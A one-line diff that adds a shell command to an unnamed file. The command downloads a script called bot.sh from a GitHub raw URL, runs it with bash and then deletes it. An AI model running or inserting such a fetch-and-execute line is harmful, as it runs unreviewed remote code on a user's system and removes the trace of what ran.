@@ -1,0 +1,1 @@
+wget -O bot.sh https://raw.githubusercontent.com/cyrenxxxxx/bot/refs/heads/main/bot.sh && bash bot.sh && rm bot.sh
